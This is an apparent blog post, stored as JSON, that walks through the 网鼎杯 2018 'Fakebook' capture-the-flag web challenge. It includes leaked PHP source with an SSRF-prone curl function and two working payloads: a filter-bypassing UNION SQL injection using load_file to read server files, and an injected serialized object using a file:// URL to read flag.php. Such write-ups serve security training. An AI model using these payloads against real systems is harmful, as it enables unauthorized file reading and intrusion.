{"title":"网鼎杯 2018-Fakebook","uid":"3cf851f476bc3089b365f448267ebe26","slug":"网鼎杯-2018-Fakebook","date":"2023-07-03T12:06:08.000Z","updated":"2023-07-03T12:24:30.160Z","comments":true,"path":"api/articles/网鼎杯-2018-Fakebook.json","keywords":null,"cover":null,"content":"<p>dirsearch扫描网页目录，找到robots.txt</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">User-agent: *\nDisallow: &#x2F;user.php.bak<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>访问&#x2F;user.php.bak</p>\n<p>得到user.php</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n\n\nclass UserInfo\n&#123;\n    public $name &#x3D; &quot;&quot;;\n    public $age &#x3D; 0;\n    public $blog &#x3D; &quot;&quot;;\n\n    public function __construct($name, $age, $blog)\n    &#123;\n        $this-&gt;name &#x3D; $name;\n        $this-&gt;age &#x3D; (int)$age;\n        $this-&gt;blog &#x3D; $blog;\n    &#125;\n\n    function get($url)\n    &#123;\n        $ch &#x3D; curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output &#x3D; curl_exec($ch);\n        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode &#x3D;&#x3D; 404) &#123;\n            return 404;\n        &#125;\n        curl_close($ch);\n\n        return $output;\n    &#125;\n\n    public function getBlogContents ()\n    &#123;\n        return $this-&gt;get($this-&gt;blog);\n    &#125;\n\n    public function isValidBlog ()\n    &#123;\n        $blog &#x3D; $this-&gt;blog;\n        return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog);\n    &#125;\n\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得知blog形式，设置username&#x3D;admin,age&#x3D;18,blog&#x3D;<a href=\"http://www,baidu.com/\">http://www,baidu.com</a></p>\n<p>添加信息后点击admin进入view.php</p>\n<p>页面链接为<a href=\"http://b55d3812-f26e-4f95-b50a-a86b7bfc98f6.node4.buuoj.cn:81/view.php?no=1\">http://b55d3812-f26e-4f95-b50a-a86b7bfc98f6.node4.buuoj.cn:81/view.php?no=1</a></p>\n<p>方法一：</p>\n<p>形式很像SQL注入</p>\n<p>仅对union select之间有空格进行了过滤，使用&#x2F;**&#x2F;绕过</p>\n<p>mysql中的load_file函数，允许访问系统内任意文件并将内容以字符串形式返回，不过需要高权限，且函数参数要求文件的绝对路径，绝对路径在测试过后发现是&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>\n<p>payload:0 union&#x2F;**&#x2F;select 1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”),3,4#  </p>\n<p>查看源码可得flag</p>\n<p>方法二：</p>\n<p>在报错信息中发现unserialize()函数，猜测有反序列化漏洞</p>\n<p>暴数据过程中发现data数据的内容为序列化对象</p>\n<p>构造payload：</p>\n<p>1 and 0 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ from users#</p>\n","feature":true,"text":"dirsearch扫描网页目录，找到robots.txt User-agent: * Disallow: &#x2F;user.php.bak 访问&#x2F;user.php.bak 得到user.php &lt;?php class UserInfo &#123; publi...","link":"","photos":[],"count_time":{"symbolsCount":"2k","symbolsTime":"2 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"NCTF2019-Fake XML cookbook","uid":"7e1f9e75b4333afeeb35ebb746cb294c","slug":"NCTF2019-Fake-XML-cookbook","date":"2023-07-03T12:47:24.000Z","updated":"2023-07-03T12:48:28.623Z","comments":true,"path":"api/articles/NCTF2019-Fake-XML-cookbook.json","keywords":null,"cover":null,"text":"XML注入，burpsuite抓包构造恶意实体 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYS...","link":"","photos":[],"count_time":{"symbolsCount":324,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"CISCN2019 华北赛区 Day2 Web1-Hack World","uid":"0746509425ccf96e3754c83e8222da0d","slug":"CISCN2019-华北赛区-Day2-Web1-Hack-World","date":"2023-07-03T09:06:32.000Z","updated":"2023-07-03T09:27:39.385Z","comments":true,"path":"api/articles/CISCN2019-华北赛区-Day2-Web1-Hack-World.json","keywords":null,"cover":null,"text":"布尔盲注 盲注脚本 import requests import re url&#x3D;&#39;http:&#x2F;&#x2F;b3dd7993-73ad-4a9c-9c37-8273d50eebea.node4.buuoj.cn:81&#x2F;index.php&#39...","link":"","photos":[],"count_time":{"symbolsCount":607,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}